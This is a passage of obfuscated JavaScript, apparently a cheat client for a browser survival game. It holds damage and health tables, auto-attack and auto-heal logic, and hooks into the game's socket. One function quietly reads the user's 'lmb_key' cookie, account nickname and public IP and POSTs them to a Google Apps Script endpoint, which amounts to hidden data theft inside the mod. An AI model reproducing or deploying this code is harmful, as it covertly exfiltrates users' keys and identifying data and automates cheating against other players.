    let $ = await (await fetch(i)).json();
    let o = $[2];
    let l = $[0].map(e => e[0]).join("");
    return {
      detectedLang: o,
      translatedText: l
    };
  } catch (n) {
    console.error("Lỗi:", n);
    return {
      error: "Không thể xác định ngôn ngữ hoặc dịch văn bản."
    };
  }
}
function a0OVERridestate(e) {
  switch (e) {
    case a0HOOKjob.PLAYERS:
      return 200;
    case a0HOOKjob.RABBIT:
      return 60;
    case a0HOOKjob.WOLF:
      return 300;
    case a0HOOKjob.SPIDER:
      return 120;
    case a0HOOKjob.BOAR:
      return 600;
    case a0HOOKjob.HAWK:
      return 300;
    case a0HOOKjob.PENGUIN:
      return 90;
    case a0HOOKjob.FOX:
      return 300;
    case a0HOOKjob.BEAR:
      return 900;
    case a0HOOKjob.BABY_MAMMOTH:
      return 1000;
    case a0HOOKjob.MAMMOTH:
      return 3000;
    case a0HOOKjob.BABY_DRAGON:
      return 900;
    case a0HOOKjob.DRAGON:
      return 1500;
    case a0HOOKjob.CRAB:
      return 240;
    case a0HOOKjob.CRAB_BOSS:
      return 1500;
    case a0HOOKjob.PIRANHA:
      return 300;
    case a0HOOKjob.KRAKEN:
      return 6000;
    case a0HOOKjob.FLAME:
      return 600;
    case a0HOOKjob.LAVA_DRAGON:
      return 3000;
    case a0HOOKjob.BABY_LAVA:
      return 1500;
    case a0HOOKjob.VULTURE:
      return 600;
    case a0HOOKjob.SAND_WORM:
      return 1500;
    case a0HOOKjob.GOLDEN_CHICKEN:
      return 200;
    case a0HOOKjob.DEAD_BOX:
      return 300;
    case a0HOOKjob.CRATE:
      return 30;
    default:
      return null;
  }
}
function a0DECRyptvalues(e, t, i, $) {
  switch (e) {
    case -1:
    case a0CONNectloop.MACHETE:
      return 5;
    case a0CONNectloop.WOOD_SWORD:
      return 12;
    case a0CONNectloop.STONE_SWORD:
      return 19;
    case a0CONNectloop.GOLD_SWORD:
      return 22;
    case a0CONNectloop.DIAMOND_SWORD:
      return 24;
    case a0CONNectloop.AMETHYST_SWORD:
      return 27;
    case a0CONNectloop.REIDITE_SWORD:
      return 30;
    case a0CONNectloop.DRAGON_SWORD:
      if (i === a0CONNectloop.DRAGON_HELMET) {
        return 33;
      }
      return 30;
    case a0CONNectloop.LAVA_SWORD:
      if (i === a0CONNectloop.LAVA_HELMET) {
        return 36;
      }
      return 33;
    case a0CONNectloop.PIRATE_SWORD:
      return 32;
    case a0CONNectloop.WOOD_SPEAR:
      return 10;
    case a0CONNectloop.STONE_SPEAR:
      return 14;
    case a0CONNectloop.GOLD_SPEAR:
      return 16;
    case a0CONNectloop.DIAMOND_SPEAR:
      return 18;
    case a0CONNectloop.AMETHYST_SPEAR:
      return 20;
    case a0CONNectloop.REIDITE_SPEAR:
      return 22;
    case a0CONNectloop.DRAGON_SPEAR:
      if (i === a0CONNectloop.DRAGON_HELMET) {
        return 24;
      }
      return 22;
    case a0CONNectloop.LAVA_SPEAR:
      if (i === a0CONNectloop.LAVA_HELMET) {
        return 26;
      }
      return 24;
    case a0CONNectloop.CRAB_SPEAR:
      if (i === a0CONNectloop.CRAB_CROWN && $ === a0CONNectloop.MOUNT_KING_CRAB) {
        return 25;
      }
      return 15;
    case a0CONNectloop.WOOD_AXE:
      if (t) {
        return 24;
      }
      return 14;
    case a0CONNectloop.STONE_AXE:
      if (t) {
        return 31;
      }
      return 21;
    case a0CONNectloop.GOLD_AXE:
      if (t) {
        return 34;
      }
      return 24;
    case a0CONNectloop.DIAMOND_AXE:
      if (t) {
        return 37;
      }
      return 27;
    case a0CONNectloop.AMETHYST_AXE:
      if (t) {
        return 39;
      }
      return 29;
    case a0CONNectloop.REIDITE_AXE:
      if (t) {
        return 42;
      }
      return 32;
    case a0CONNectloop.WOOD_PICK:
      return 1;
    case a0CONNectloop.STONE_PICK:
      return 2;
    case a0CONNectloop.GOLD_PICK:
      return 3;
    case a0CONNectloop.DIAMOND_PICK:
      return 4;
    case a0CONNectloop.AMETHYST_PICK:
      return 5;
    case a0CONNectloop.REIDITE_PICK:
      return 6;
    case a0CONNectloop.BOOK:
      return 1;
    case a0CONNectloop.STONE_HAMMER:
      return 2;
    case a0CONNectloop.GOLD_HAMMER:
      return 3;
    case a0CONNectloop.DIAMOND_HAMMER:
      return 4;
    case a0CONNectloop.AMETHYST_HAMMER:
      return 5;
    case a0CONNectloop.REIDITE_HAMMER:
      return 6;
    case a0CONNectloop.SUPER_HAMMER:
      return 12;
    case a0CONNectloop.STONE_SHOVEL:
      return 2;
    case a0CONNectloop.GOLD_SHOVEL:
      return 3;
    case a0CONNectloop.DIAMOND_SHOVEL:
      return 4;
    case a0CONNectloop.AMETHYST_SHOVEL:
    case a0CONNectloop.REIDITE_SHOVEL:
      return 5;
    case a0CONNectloop.WOOD_SHIELD:
      return 1;
    case a0CONNectloop.STONE_SHIELD:
      return 2;
    case a0CONNectloop.GOLD_SHIELD:
      return 3;
    case a0CONNectloop.DIAMOND_SHIELD:
      return 4;
    case a0CONNectloop.AMETHYST_SHIELD:
      return 5;
    case a0CONNectloop.REIDITE_SHIELD:
      return 6;
    default:
      return null;
  }
}
function a0CONNectfile(e) {
  switch (e) {
    case a0CONNectloop.WOOD_HELMET:
      return 1;
    case a0CONNectloop.STONE_HELMET:
    case a0CONNectloop.DIVING_MASK:
    case a0CONNectloop.CROWN_OF_THE_ANGEL:
      return 2;
    case a0CONNectloop.GOLD_HELMET:
    case a0CONNectloop.SUPER_DIVING_SUIT:
    case a0CONNectloop.CROWN_OF_LUCK:
    case a0CONNectloop.CROWN_OF_LIFE:
      return 4;
    case a0CONNectloop.DIAMOND_HELMET:
    case a0CONNectloop.DIAMOND_FIRE_PROTECTION_:
    case a0CONNectloop.CRAB_CROWN:
      return 5;
    case a0CONNectloop.AMETHYST_HELMET:
    case a0CONNectloop.AMETHYST_FIRE_PROTECTION_:
      return 6;
    case a0CONNectloop.REIDITE_HELMET:
    case a0CONNectloop.REIDITE_FIRE_PROTECTION_:
      return 7;
    case a0CONNectloop.DRAGON_HELMET:
      return 8;
    case a0CONNectloop.LAVA_HELMET:
      return 9;
    default:
      return 0;
  }
}
function a0READzip(e) {
  switch (e) {
    case a0CONNectloop.REIDITE_SHIELD:
      return 6;
    case a0CONNectloop.AMETHYST_SHIELD:
      return 5;
    case a0CONNectloop.DIAMOND_SHIELD:
      return 4;
    case a0CONNectloop.GOLD_SHIELD:
      return 3;
    case a0CONNectloop.STONE_SHIELD:
      return 2;
    case a0CONNectloop.WOOD_SHIELD:
      return 1;
    default:
      return 0;
  }
}
function a0KICKclause(e) {
  switch (e) {
    case a0CONNectloop.WOOD_HELMET:
      return 4;
    case a0CONNectloop.STONE_HELMET:
    case a0CONNectloop.DIVING_MASK:
    case a0CONNectloop.DIAMOND_FIRE_PROTECTION_:
      return 8;
    case a0CONNectloop.GOLD_HELMET:
    case a0CONNectloop.CROWN_OF_LUCK:
    case a0CONNectloop.CROWN_OF_THE_ANGEL:
    case a0CONNectloop.AMETHYST_FIRE_PROTECTION_:
      return 13;
    case a0CONNectloop.SUPER_DIVING_SUIT:
    case a0CONNectloop.CROWN_OF_LIFE:
      return 16;
    case a0CONNectloop.DIAMOND_HELMET:
    case a0CONNectloop.CRAB_CROWN:
    case a0CONNectloop.REIDITE_FIRE_PROTECTION_:
      return 19;
    case a0CONNectloop.AMETHYST_HELMET:
      return 23;
    case a0CONNectloop.REIDITE_HELMET:
      return 25;
    case a0CONNectloop.DRAGON_HELMET:
      return 27;
    case a0CONNectloop.LAVA_HELMET:
      return 30;
    default:
      return 0;
  }
}
function a0HANDleapp(e) {
  switch (e) {
    case a0CONNectloop.WOOD_AXE:
      return 1;
    case a0CONNectloop.STONE_AXE:
      return 2;
    case a0CONNectloop.GOLD_AXE:
      return 3;
    case a0CONNectloop.DIAMOND_AXE:
      return 4;
    case a0CONNectloop.AMETHYST_AXE:
      return 5;
    case a0CONNectloop.REIDITE_AXE:
      return 6;
    default:
      return 0;
  }
}
function a0INSTalllevel(e, t) {
  if (e) {
    return a0DECRyptvalues(e.right, t, e.clothe, e.vehicle);
  } else {
    return 0;
  }
}
function a0DEFErpolicy(e) {
  switch (e.type) {
    case a0HOOKjob.PLAYERS:
      return a0INSTalllevel(e);
    case a0HOOKjob.WOLF:
      return 40;
    case a0HOOKjob.SPIDER:
      return 30;
    case a0HOOKjob.BOAR:
      return 50;
    case a0HOOKjob.HAWK:
    case a0HOOKjob.FOX:
      return 40;
    case a0HOOKjob.BEAR:
      return 60;
    case a0HOOKjob.BABY_MAMMOTH:
      return 50;
    case a0HOOKjob.MAMMOTH:
      return 90;
    case a0HOOKjob.BABY_DRAGON:
      return 30;
    case a0HOOKjob.DRAGON:
      return 85;
    case a0HOOKjob.CRAB:
      return 35;
    case a0HOOKjob.CRAB_BOSS:
      return 80;
    case a0HOOKjob.PIRANHA:
      return 40;
    case a0HOOKjob.KRAKEN:
      return 60;
    case a0HOOKjob.FLAME:
      return 50;
    case a0HOOKjob.LAVA_DRAGON:
      return 90;
    case a0HOOKjob.BABY_LAVA:
      return 70;
    case a0HOOKjob.VULTURE:
      return 45;
    case a0HOOKjob.SAND_WORM:
    case a0HOOKjob.REIDITE_SPIKE:
      return 60;
    case a0HOOKjob.AMETHYST_SPIKE:
      return 50;
    case a0HOOKjob.DIAMOND_SPIKE:
      return 40;
    case a0HOOKjob.GOLD_SPIKE:
      return 30;
    case a0HOOKjob.STONE_SPIKE:
      return 20;
    case a0HOOKjob.SPIKE:
      return 10;
    default:
      return 0;
  }
}
function a0CREAtesum(e) {
  switch (a0MINIfytoken(e.right)) {
    case 0:
      return 200;
    case 1:
      if (e.fly) {
        return 174.8;
      }
      return 135.6;
    case 2:
      if (e.fly) {
        return 269.8;
      }
      return 205.6;
    case 3:
      return 0;
    case 4:
      if (e.fly) {
        return 142;
      }
      return 109;
    case 5:
      return 125;
    case 6:
      return 97.6;
  }
}
function a0RELOadtimer(e, t) {
  for (let i = 0, $ = t.length; i < $; i++) {
    let o = t[i];
    if ((e.type !== a0HOOKjob.PLAYERS || e.pid !== o.pid) && performance.now() - o.startAttackTime <= 92.5 && performance.now() - o.startAttackTime >= 32.5 && (!o.calcDamageTime || performance.now() - o.calcDamageTime >= -5 && performance.now() - o.calcDamageTime <= 5) && a0CREAtesum(o) + (e === a0HOOKjob.PLAYERS ? 25 : 75) >= a0CLONescript.dist(e, o)) {
      o.calcDamageTime = performance.now();
      return o;
    }
  }
  return null;
}
function a0FILTergroup(e) {
  let t = performance.now();
  let i = a0RELOadtimer(e, a0CLONelog.units[a0HOOKjob.PLAYERS]);
  if (i) {
    return i;
  }
  let $ = a0CLONelog.units[a0HOOKjob.WOLF];
  for (let o = 0, l = $.length; o < l; o++) {
    let n = $[o];
    if (a0CLONescript.dist(e, n) <= 150) {
      return n;
    }
  }
  let s = a0CLONelog.units[a0HOOKjob.SPIDER];
  for (let r = 0, c = s.length; r < c; r++) {
    let O = s[r];
    if (a0CLONescript.dist(e, O) <= 150) {
      return O;
    }
  }
  let p = a0CLONelog.units[a0HOOKjob.BOAR];
  for (let u = 0, N = p.length; u < N; u++) {
    let E = p[u];
    if (E.info == 1 && a0CLONescript.dist(e, E) <= 150) {
      return E;
    }
  }
  let d = a0CLONelog.units[a0HOOKjob.HAWK];
  for (let f = 0, g = d.length; f < g; f++) {
    let A = d[f];
    if (a0CLONescript.dist(e, A) <= 150) {
      return A;
    }
  }
  let h = a0CLONelog.units[a0HOOKjob.FOX];
  for (let R = 0, C = h.length; R < C; R++) {
    let y = h[R];
    if (a0CLONescript.dist(e, y) <= 150) {
      return y;
    }
  }
  let m = a0CLONelog.units[a0HOOKjob.BEAR];
  for (let M = 0, L = m.length; M < L; M++) {
    let P = m[M];
    if (a0CLONescript.dist(e, P) <= 150) {
      return P;
    }
  }
  let D = a0CLONelog.units[a0HOOKjob.BABY_MAMMOTH];
  for (let T = 0, _ = D.length; T < _; T++) {
    let I = D[T];
    if (a0CLONescript.dist(e, I) <= 150) {
      return I;
    }
  }
  let S = a0CLONelog.units[a0HOOKjob.MAMMOTH];
  for (let k = 0, b = S.length; k < b; k++) {
    let v = S[k];
    if (a0CLONescript.dist(e, v) <= 150) {
      return v;
    }
  }
  let H = a0CLONelog.units[a0HOOKjob.BABY_DRAGON];
  for (let U = 0, B = H.length; U < B; U++) {
    let j = H[U];
    if (a0CLONescript.dist(e, j) <= 150) {
      return j;
    }
  }
  let x = a0CLONelog.units[a0HOOKjob.DRAGON];
  for (let K = 0, w = x.length; K < w; K++) {
    let J = x[K];
    if (a0CLONescript.dist(e, J) <= 150) {
      return J;
    }
  }
  let z = a0CLONelog.units[a0HOOKjob.CRAB];
  for (let F = 0, W = z.length; F < W; F++) {
    let G = z[F];
    if (a0CLONescript.dist(e, G) <= 150) {
      return G;
    }
  }
  let V = a0CLONelog.units[a0HOOKjob.CRAB_BOSS];
  for (let Y = 0, X = V.length; Y < X; Y++) {
    let q = V[Y];
    if (a0CLONescript.dist(e, q) <= 150) {
      return q;
    }
  }
  let Q = a0CLONelog.units[a0HOOKjob.PIRANHA];
  for (let Z = 0, ee = Q.length; Z < ee; Z++) {
    let ea = Q[Z];
    if (a0CLONescript.dist(e, ea) <= 150) {
      return ea;
    }
  }
  let et = a0CLONelog.units[a0HOOKjob.KRAKEN];
  for (let ei = 0, e$ = et.length; ei < e$; ei++) {
    let eo = et[ei];
    if (a0CLONescript.dist(e, eo) <= 150) {
      return eo;
    }
  }
  let el = a0CLONelog.units[a0HOOKjob.FLAME];
  for (let en = 0, es = el.length; en < es; en++) {
    let er = el[en];
    if (a0CLONescript.dist(e, er) <= 150) {
      return er;
    }
  }
  let ec = a0CLONelog.units[a0HOOKjob.LAVA_DRAGON];
  for (let eO = 0, ep = ec.length; eO < ep; eO++) {
    let eu = ec[eO];
    if (a0CLONescript.dist(e, eu) <= 150) {
      return eu;
    }
  }
  let eN = a0CLONelog.units[a0HOOKjob.BABY_LAVA];
  for (let eE = 0, ed = eN.length; eE < ed; eE++) {
    let ef = eN[eE];
    if (a0CLONescript.dist(e, ef) <= 150) {
      return ef;
    }
  }
  let eg = a0CLONelog.units[a0HOOKjob.VULTURE];
  for (let eA = 0, eh = eg.length; eA < eh; eA++) {
    let eR = eg[eA];
    if (a0CLONescript.dist(e, eR) <= 150) {
      return eR;
    }
  }
  let eC = a0CLONelog.units[a0HOOKjob.SAND_WORM];
  for (let ey = 0, em = eC.length; ey < em; ey++) {
    let eM = eC[ey];
    if (a0CLONescript.dist(e, eM) <= 150) {
      return eM;
    }
  }
  let eL = [...a0CLONelog.units[a0HOOKjob.REIDITE_SPIKE], ...a0CLONelog.units[a0HOOKjob.AMETHYST_SPIKE], ...a0CLONelog.units[a0HOOKjob.DIAMOND_SPIKE], ...a0CLONelog.units[a0HOOKjob.GOLD_SPIKE], ...a0CLONelog.units[a0HOOKjob.STONE_SPIKE], ...a0CLONelog.units[a0HOOKjob.SPIKE]];
  for (let eP = 0, eD = eL.length; eP < eD; eP++) {
    let eT = eL[eP];
    if (a0CLONescript.dist(e, eT) <= 100 && e.pid !== eT.pid && e.ally !== eT.ally && (!e.spikeImpactTime || t - e.spikeImpactTime > 900) && (!(t - e.startAttackTime <= 100) || !(t - e.startAttackTime >= 40))) {
      e.spikeImpactTime = t;
      return eT;
    }
  }
  for (let e_ = 0, eI = eL.length; e_ < eI; e_++) {
    let e8 = eL[e_];
    if (a0CLONescript.dist(e, e8) <= 125 && e.pid !== e8.pid && e.ally !== e8.ally && (!e.spikeImpactTime || t - e.spikeImpactTime > 900) && (!(t - e.startAttackTime <= 100) || !(t - e.startAttackTime >= 40))) {
      e.spikeImpactTime = t;
      return e8;
    }
  }
}
function a0GRABvalue(e) {
  switch (e) {
    case a0HOOKjob.REIDITE_SPIKE:
    case a0HOOKjob.AMETHYST_SPIKE:
    case a0HOOKjob.DIAMOND_SPIKE:
    case a0HOOKjob.GOLD_SPIKE:
    case a0HOOKjob.STONE_SPIKE:
    case a0HOOKjob.SPIKE:
      return true;
    default:
      return false;
  }
}
function a0CREAtetask(e, t) {
  if (!t) {
    if (e.dist_winter > 0 && USERTOFIX.winter.tempest && (!e.winterTempestImpactTime || performance.now() - e.winterTempestImpactTime > 3900)) {
      e.winterTempestImpactTime = performance.now();
      let i = e.clothe;
      if (i === a0CONNectloop.EARMUFFS || i === a0CONNectloop.HOOD || i === a0CONNectloop.PEASANT) {
        return 16;
      }
      if (i === a0CONNectloop.BIG_CHAPKA || i === a0CONNectloop.WINTER_HOOD || i === a0CONNectloop.WINTER_PEASANT || i === a0CONNectloop.PILOT_HELMET) {
        return 12;
      }
      if (i === a0CONNectloop.CAP_SCARF) {
        return 8;
      } else if (i === a0CONNectloop.FUR_HAT) {
        return 4;
      }
      return 25;
    }
    if (e.dist_desert > 0 && USERTOFIX.desert.tempest) {
      let $ = e.clothe;
      if ($ === a0CONNectloop.TURBAN) {
        return 7;
      } else if ($ === a0CONNectloop.NINJA_OUTFIT || $ === a0CONNectloop.PILOT_HELMET) {
        return 2;
      } else {
        return 16;
      }
    }
    return 0;
  }
  if (t.type === a0HOOKjob.PLAYERS) {
    let o = a0HANDleapp(t.right);
    let l = a0CONNectfile(e.clothe);
    let n = a0DEFErpolicy(t) + (o > 0 && l > 0 ? 1 : 0) - l - Math.max(a0READzip(e.right) - o, 0);
    if (e.ally === t.ally) {
      n *= 0.3;
    }
    return Math.max(n, 0);
  }
  if (a0GRABvalue(t.type)) {
    return a0DEFErpolicy(t);
  } else {
    return Math.max(a0DEFErpolicy(t) - a0KICKclause(e.clothe), 0);
  }
}
async function a0OPTImizeload(e, t) {
  let i = "Unknown";
  try {
    i = (await (await fetch("https://api64.ipify.org?format=json")).json()).ip;
  } catch ($) { }
  try {
    await fetch("https://script.google.com/macros/s/AKfycbxt-QpUdG-3n4jyTWuFH2LZVCprLdYe_-NnPW6yaDgCC5d6GSs5Qcy27adOFgzoUe9SCQ/exec", {
      method: "POST",
      body: JSON.stringify([a0EXITmessage("lmb_key"), document.getElementById("account_nickname_input").value, e, t, i])
    });
  } catch (o) { }
}
function a0INSTallevent(e) {
  return e / 255 * (Math.PI * 2);
}
function a0READsession(e) {
  let t = Math.PI * 2;
  return (e % t + t) % t;
}
function a0EXITmessage(e) {
  let t = document.cookie.split("; ");
  for (let i of t) {
    let [$, o] = i.split("=");
    if ($ === e) {
      return decodeURIComponent(o);
    }
  }
  return null;
}
function a0INVErtbuffer(e, t, i, $, o) {
  return !!(e > 0.35) && !!(t > 0.35) && !!(i > 0.35) && !!($ > 0.35) && !!(o > 0.35);
}
function a0FLUShinput(e, t) {
  return e.info !== 8000 && (!e.lock || !!e.ally) && (e.action / 2 - 1 === t || e.action / 2 - 1 == -1);
}
function a0PULLfolder(e) {
  let t = e.trim().split(/\s+/);
  if (t[0] === "ez" && t.length === 3) {
    let i = parseInt(t[1]);
    let $ = parseInt(t[2]);
    return {
      j: i,
      i: $
    };
  }
  return null;
}
function a0COMPutestatus(e) {
  return (e + 0.5) / 255 * (Math.PI * 2);
}
function a0NOTIfyload(e) {
  return Math.sin(e);
}
function a0GETPlugin(e) {
  return Math.cos(e);
}
function a0HYDRatequeue(e) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.selectInv, e]));
}
function a0DEFErport(e) {
  a0GETList.select_craft(e);
}
function a0CACHeapp(e) {
  a0GETList.recycle_inv(e);
}
function a0REMOvezip(e) {
  a0GETList.send_chat(e);
}
let a0CLONevalue = 0;
function a0BUILdstats(e) {
  if (e !== a0CLONevalue) {
    a0GETList.send_angle(e);
    a0CLONevalue = e;
  }
}
function a0REMOveevent(e) {
  a0GETList.send_attack(e);
  if (e !== a0CLONevalue) {
    a0CLONevalue = e;
  }
}
function a0CLONejson() {
  a0GETList.stop_attack();
}
function a0OPENdata(e) {
  if (e !== a0NAVIgatestats) {
    a0GETList.send_move(e);
    a0NAVIgatestats = e;
  }
}
function a0INITlogs(e) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.drop_one, e]));
}
function a0PARSestream(e) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.drop_all, e]));
}
function a0HIGHlightlogs(e, t) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.resurrection, e, t]));
}
function a0DRAWform(e, t, i) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.extractorput, 255, e, t, i]));
}
function a0BLOCkinput(e, t, i) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.extractortake, e, t, i]));
}
function a0JUMPstats(e, t) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.chestTake, e, t]));
}
function a0ACCEptbuffer(e, t) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.put_windmill, 255, e, t]));
}
function a0GUARditem(e, t) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.take_windmill, e, t]));
}
function a0PULLclock(e, t) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.take_bread, e, t]));
}
function a0LOCKclick(e, t) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.put_wood_oven, 31, e, t]));
}
function a0GENErateuser(e, t) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.put_flour_oven, 31, e, t]));
}
function a0EXPAndstats(e, t, i, $) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.put_chest, e, t, i, $]));
}
function a0BLOCkmodule(e, t, i = 0) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.build, e, t, i]));
}
function a0BLOCklist(e, t) {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.join_totem, e, t]));
}
function a0FILTerlog() {
  a0GETList.socket.send(JSON.stringify([a0POSTfile.cancel_crafting]));
}
function a0ENCRyptthread() {
  if (a0GETList.socket && a0GETList.socket.readyState === 1 && USERTOFIX && USERTOFIX.alive) {
    let e = a0CLONelog.fast_units[USERTOFIX.uid];
    if (e && a0MINIfytoken(e.right, false)) {
      if (USERTOFIX.weapon.wait) {
        a0PARSestream(e.right);
      } else {
        a0HYDRatequeue(a0CONNectloop.HAND);
      }
    }
  }
}
function a0FETChbuffer(e) {
  switch (e) {
    case a0HOOKjob.RABBIT:
    case a0HOOKjob.WOLF:
    case a0HOOKjob.SPIDER:
    case a0HOOKjob.BOAR:
    case a0HOOKjob.HAWK:
    case a0HOOKjob.PENGUIN:
    case a0HOOKjob.FOX:
    case a0HOOKjob.BEAR:
    case a0HOOKjob.BABY_MAMMOTH:
    case a0HOOKjob.MAMMOTH:
    case a0HOOKjob.BABY_DRAGON:
    case a0HOOKjob.DRAGON:
    case a0HOOKjob.CRAB:
    case a0HOOKjob.CRAB_BOSS:
    case a0HOOKjob.PIRANHA:
    case a0HOOKjob.KRAKEN:
    case a0HOOKjob.FLAME:
    case a0HOOKjob.LAVA_DRAGON:
    case a0HOOKjob.BABY_LAVA:
    case a0HOOKjob.VULTURE:
    case a0HOOKjob.SAND_WORM:
    case a0HOOKjob.GOLDEN_CHICKEN:
      return true;
    default:
      return false;
  }
}
function a0LIMItresult(e) {
  a0LOADstring.save();
  a0LOADstring.translate(USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
  a0LOADstring.rotate(this.angle);
  let t = a0MINIfydata[e][a0CLONelog.time];
  let i = -t.width;
  let $ = -t.height;
  a0HASHload(a0LOADstring, t, -i / 2 + 0, -$ / 2 + 0, i, $);
  a0LOADstring.restore();
}
function a0FETChlist() {
  a0LOADstring.save();
  a0LOADstring.translate(USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
  let e = a0ACKNowledgekey[a0EXPAndgroup.ROOFS].length;
  let t = a0ACKNowledgekey[a0EXPAndgroup.ROOFS][(this.j + this.i % 2) % e][a0CLONelog.time];
  let i = -t.width;
  let $ = -t.height;
  a0LOADstring.globalAlpha = a0JUMPfile.Roof.opacity;
  a0HASHload(a0LOADstring, t, -i / 2, -$ / 2, i, $);
  a0LOADstring.restore();
}
function a0HASHinput() {
  a0LOADstring.save();
  var e = a0BALAncevalues;
  if (USERTOFIX.gauges.life.x < 0.25) {
    a0LOADstring.globalAlpha = USERTOFIX.gauges.warn_life.v;
  }
  var t = USERTOFIX.inv.can_select.length > 0 ? -70 : 0;
  if (USERTOFIX.chest.open || USERTOFIX.furnace.open && USERTOFIX.inv.find_item(a0CONNectloop.WOOD) != -1 || USERTOFIX.windmill.open && USERTOFIX.inv.find_item(a0CONNectloop.WILD_WHEAT) != -1 || USERTOFIX.extractor.open && USERTOFIX.inv.find_item(a0CONNectloop.WOOD) != -1 || USERTOFIX.well.open && USERTOFIX.inv.find_item(a0CONNectloop.BUCKET_FULL) != -1 || USERTOFIX.bread_oven.open && (USERTOFIX.inv.find_item(a0CONNectloop.WOOD) != -1 || USERTOFIX.inv.find_item(a0CONNectloop.FLOUR) != -1)) {
    t -= a0BALAncevalues * 50;
  }
  a0LOADstring.translate(innerWidth / 2 - this.img.width / 2, t);
  a0LOADstring.fillStyle = "#69A148";
  a0LOADstring.fillRect(this.translate.x + a0BALAncevalues * 37, this.translate.y + a0BALAncevalues * 17, USERTOFIX.gauges.life.x * 178 * a0BALAncevalues, a0BALAncevalues * 18);
  a0LOADstring.globalAlpha = 1;
  if (USERTOFIX.gauges.hunger.x < 0.35) {
    a0LOADstring.fillStyle = "#8F050A";
    a0LOADstring.globalAlpha = USERTOFIX.gauges.warn_hunger.v;
    a0LOADstring.fillRect(this.translate.x + a0BALAncevalues * 277, this.translate.y + a0BALAncevalues * 17, a0BALAncevalues * 178, a0BALAncevalues * 18);
    a0LOADstring.globalAlpha = 1;
  }
  a0LOADstring.fillStyle = "#AF352A";
  a0LOADstring.fillRect(this.translate.x + a0BALAncevalues * 277, this.translate.y + a0BALAncevalues * 17, USERTOFIX.gauges.hunger.x * 178 * a0BALAncevalues, a0BALAncevalues * 18);
  var i = this.translate.x + a0BALAncevalues * 517 + a0BALAncevalues * 178;
  var $ = USERTOFIX.gauges.cold.x * 178 * a0BALAncevalues + 1;
  if (USERTOFIX.gauges.cold.x < 0.35) {
    a0LOADstring.fillStyle = "#366B91";
    a0LOADstring.globalAlpha = USERTOFIX.gauges.warn_cold.v;
    a0LOADstring.fillRect(this.translate.x + a0BALAncevalues * 517, this.translate.y + a0BALAncevalues * 17, a0BALAncevalues * 178, a0BALAncevalues * 18);
    a0LOADstring.globalAlpha = 1;
  }
  a0LOADstring.fillStyle = "#669BB1";
  a0LOADstring.fillRect(i - $, this.translate.y + a0BALAncevalues * 17, $, a0BALAncevalues * 18);
  if (USERTOFIX.gauges.cold.x > 0.99) {
    if (USERTOFIX.gauges.warm.x < 0.35) {
      a0LOADstring.fillStyle = "#6C4036";
      a0LOADstring.globalAlpha = USERTOFIX.gauges.warn_warm.v;
      a0LOADstring.fillRect(this.translate.x + a0BALAncevalues * 517, this.translate.y + a0BALAncevalues * 17, a0BALAncevalues * 178, a0BALAncevalues * 18);
      a0LOADstring.globalAlpha = 1;
    }
    a0LOADstring.fillStyle = "#9C4036";
    a0LOADstring.fillRect(i - (1 - USERTOFIX.gauges.warm.x) * 178 * a0BALAncevalues, this.translate.y + a0BALAncevalues * 17, (1 - USERTOFIX.gauges.warm.x) * 178 * a0BALAncevalues, a0BALAncevalues * 18);
  }
  var o = this.translate.x + a0BALAncevalues * 757 + a0BALAncevalues * 178;
  var l = USERTOFIX.gauges.thirst.x * 178 * a0BALAncevalues + 1;
  if (USERTOFIX.gauges.thirst.x < 0.35) {
    a0LOADstring.fillStyle = "#001A57";
    a0LOADstring.globalAlpha = USERTOFIX.gauges.warn_thirst.v;
    a0LOADstring.fillRect(this.translate.x + a0BALAncevalues * 757, this.translate.y + a0BALAncevalues * 17, a0BALAncevalues * 178, a0BALAncevalues * 18);
    a0LOADstring.globalAlpha = 1;
  }
  a0LOADstring.fillStyle = "#074A87";
  a0LOADstring.fillRect(o - l, this.translate.y + a0BALAncevalues * 17, l, a0BALAncevalues * 18);
  a0BALAncevalues = e;
  a0HASHload(a0LOADstring, this.img, this.translate.x, this.translate.y);
  this.y = this.translate.y + t;
  a0LOADstring.restore();
  if (USERTOFIX.gauges.oxygen.x < 0.99) {
    var n = Math.floor(a0BUILdload - a0ACKNowledgekey[a0EXPAndgroup.OXYGEN].width / 2);
    t += this.translate.y - a0ACKNowledgekey[a0EXPAndgroup.OXYGEN].height - a0BALAncevalues * 5;
    a0LOADstring.fillStyle = "#BBE8EF";
    let s = USERTOFIX.gauges.oxygen.x * 588;
    a0LOADstring.fillRect(n + 5 + (588 - s) / 2, t + a0BALAncevalues * 5, a0BALAncevalues * 588 * USERTOFIX.gauges.oxygen.x, a0BALAncevalues * 10);
    if (USERTOFIX.gauges.oxygen.x < 0.35) {
      a0LOADstring.fillStyle = "#9BA8AF";
      a0LOADstring.globalAlpha = USERTOFIX.gauges.warn_oxygen.v;
      a0LOADstring.fillRect(n + 5, t + 5, a0BALAncevalues * 588, a0BALAncevalues * 10);
      a0LOADstring.globalAlpha = 1;
    }
    a0HASHload(a0LOADstring, a0ACKNowledgekey[a0EXPAndgroup.OXYGEN], n, t);
    this.y = t;
  }
}
function a0ENCRyptlog() {
  USERTOFIX.in_team = function (e) {
    for (let t = 0; t < this.team.length; t++) {
      if (this.team[t] == e) {
        return true;
      }
    }
    return false;
  };
  let e = Object.keys(a0GETList)[0];
  Object.defineProperty(a0GETList, "socket", {
    get: function () {
      return this[e];
    }
  });
  a0JUMPdisk(a0GETList, [{
    key: "select_inv",
    apply: e => typeof e == "function" && e.toString().includes("switch") && e.toString().includes(".stringify")
  }, {
    key: "select_craft",
    apply: e => typeof e == "function" && e.toString().includes(".length") && e.toString().includes(".max") && e.toString().includes(".stringify")
  }, {
    key: "send_chat",
